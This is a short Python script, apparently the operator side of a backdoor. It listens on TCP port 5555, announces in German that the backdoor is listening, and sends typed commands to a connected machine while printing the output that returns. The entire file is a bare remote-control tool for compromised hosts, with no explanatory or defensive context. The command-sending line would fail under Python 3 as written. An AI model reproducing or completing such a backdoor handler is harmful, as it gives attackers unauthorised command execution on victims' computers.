from socket import *
import socket

client = ''
port = 5555
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
s.bind((client, port))
print('Backdoor hoert zu')
s.listen(1)
conn, addr = s.accept()
while True:
    cmd = input()
    conn.send(cmd)
    if cmd == ':q':
        break
    data = conn.recv(1924)
    print(data)

conn.close()
